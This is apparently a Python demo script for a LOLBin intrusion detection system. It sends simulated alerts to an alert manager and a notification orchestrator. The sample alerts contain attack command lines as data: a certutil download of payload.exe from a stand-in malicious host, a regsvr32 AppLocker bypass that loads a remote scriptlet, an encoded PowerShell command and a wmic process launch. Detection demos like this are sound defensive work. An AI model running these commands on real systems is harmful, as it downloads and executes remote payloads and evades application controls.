import sys
import os
import time
import threading
import subprocess
from datetime import datetime

# Add the src directory to the path
src_path = os.path.join(os.path.dirname(__file__), 'src')
sys.path.append(src_path)

# Import components directly
from src.rules.enhanced_rule_engine import EnhancedRuleEngine
from src.alerts.alert_system import AlertManager
from src.notification.notification_orchestrator import NotificationOrchestrator

def print_header(message):
    print("\n" + "=" * 60)
    print(f"  {message}")
    print("=" * 60)

def start_detection_components():
    print_header("Starting LOLBin IDS Components")
    
    # Initialize components
    rule_engine = EnhancedRuleEngine()
    alert_manager = AlertManager()
    orchestrator = NotificationOrchestrator()
    
    # Start monitoring thread
    def monitor_thread():
        print("Monitoring thread started...")
        # This is a simplified process monitoring loop
        while True:
            time.sleep(1)
    
    threading.Thread(target=monitor_thread, daemon=True).start()
    
    print("All components started. Ready for attack simulation!")
    return rule_engine, alert_manager, orchestrator

def simulate_direct_alerts(alert_manager, orchestrator):
    """Create and send alerts directly without using the rule engine"""
    print_header("Simulating LOLBin Attack Chain")
    
    # Create sample alerts
    sample_alerts = [
        {
            'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            'rule_name': "PowerShell Encoded Command",
            'description': "PowerShell executing encoded commands",
            'severity': 4,
            'process_name': "powershell.exe",
            'command_line': "powershell.exe -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgACcASABlAGwAbABvACAAVwBvAHIAbABkACcA",
            'pid': 1001,
            'username': "demo_user"
        },
        {
            'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            'rule_name': "CertUtil Download",
            'description': "CertUtil used to download files from internet",
            'severity': 4,
            'process_name': "certutil.exe",
            'command_line': "certutil.exe -urlcache -f http://malicious.com/payload.exe C:\\temp\\malware.exe",
            'pid': 1002,
            'username': "demo_user"
        },
        {
            'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            'rule_name': "Regsvr32 AppLocker Bypass",
            'description': "Regsvr32 used to bypass AppLocker",
            'severity': 5,
            'process_name': "regsvr32.exe",
            'command_line': "regsvr32.exe /s /u /i:http://example.com/file.sct scrobj.dll",
            'pid': 1003,
            'username': "demo_user"
        },
        {
            'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            'rule_name': "WMIC Process Creation",
            'description': "WMIC used to create process",
            'severity': 3,
            'process_name': "wmic.exe",
            'command_line': "wmic.exe process call create calc.exe",
            'pid': 1004,
            'username': "demo_user"
        }
    ]
    
    for i, alert in enumerate(sample_alerts):
        stage = i + 1
        process_name = alert['process_name']
        command = alert['command_line']
        
        print(f"\nStage {stage}: Executing {process_name} with command: {command}")
        
        # Send through alert manager
        alert_manager.send_alert(alert)
        
        # Send through notification orchestrator
        orchestrator.process_alert(alert)
        
        # Display alert details
        print(f"[!] DETECTED: Alert generated!")
        print(f"  - Rule: {alert['rule_name']} (Severity: {alert['severity']})")
        print(f"    Description: {alert['description']}")
        
        # Wait for visual confirmation
        time.sleep(3)
    
    print_header("Attack Simulation Complete")
    print("Check your notification system for alerts!")

def main():
    print_header("LOLBin IDS Demo")
    print("This script will simulate a multi-stage LOLBin attack chain.")
    print("You'll see detection alerts and notifications in real-time.")
    
    input("\nPress Enter to begin the demo...\n")
    
    # Start components
    rule_engine, alert_manager, orchestrator = start_detection_components()
    
    # Wait to ensure everything is initialized
    time.sleep(2)
    
    # Simulate alerts directly (bypass rule engine)
    simulate_direct_alerts(alert_manager, orchestrator)
    
    # Keep the script running to see notifications
    print("\nKeep this window open to see notifications. Press Ctrl+C to exit.")
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nDemo completed. Exiting...")

if __name__ == "__main__":
    main()
    